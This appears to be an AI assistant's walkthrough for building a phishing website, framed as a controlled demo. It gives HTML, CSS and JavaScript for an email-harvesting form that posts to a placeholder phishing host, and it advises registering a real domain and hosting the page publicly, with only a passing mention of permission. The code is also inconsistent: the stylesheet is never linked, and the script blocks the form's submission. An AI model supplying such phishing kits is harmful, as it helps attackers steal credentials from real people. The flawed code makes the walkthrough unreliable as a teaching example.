Building a dummy website for demonstrating phishing attacks in a controlled environment is a common practice for security professionals. Here are the steps to create a simple phishing website using HTML, CSS, and JavaScript:

1. Choose a domain name:
   You can use a free domain name service like Freenom or Google Domains to register a domain name for your phishing website. Make sure the domain name is not already in use.

2. Create the HTML file:
   Create a new file called `index.html` and add the following code:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>
    <div style="width: 100%; height: 100%; background-color: #f1f1f1;">
        <div style="width: 30%; height: 30%; margin: auto; background-color: #f1f1f1;">
            <img src="logo.png" alt="Logo">
            <h1>Welcome to our website</h1>
            <p>Please enter your email address to continue.</p>
            <form action="https://your-phishing-site.com/login.php" method="post">
                <input type="email" name="email" placeholder="Email address">
                <button type="submit">Submit</button>
            </form>
        </div>
    </div>
</body>
</html>
```

Replace `logo.png` with the logo image you want to use.

3. Create the CSS file:
   Create a new file called `styles.css` and add the following code:

```css
body {
    font-family: Arial, sans-serif;
    width: 100%;
    height: 100%;
    margin: 0;
    padding: 0;
}

div {
    width: 100%;
    height: 100%;
}

img {
    width: 100%;
    height: auto;
}

h1 {
    text-align: center;
}

p {
    text-align: center;
}

form {
    width: 100%;
    height: 100%;
    padding: 20px;
}

input[type="email"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
}

button[type="submit"] {
    width: 100%;
    padding: 10px;
    background-color: #4CAF50;
    color: white;
    border: none;
    cursor: pointer;
}
```

4. Create the JavaScript file:
   Create a new file called `script.js` and add the following code:

```javascript
document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault();
    window.location.href = 'https://your-phishing-site.com/login.php';
});
```

Replace `https://your-phishing-site.com/login.php` with the URL of your phishing site.

5. Serve the files:
   You can serve the files locally using a web server like Apache or Nginx. Alternatively, you can use a free hosting service like GitHub Pages or Google Drive to host the files. Make sure the files are accessible via HTTPS.

6. Test the phishing website:
   Open the phishing website in a web browser and try to enter your email address. The website should redirect you to the phishing site. Make sure the phishing site is secure and that you have permission to test it.
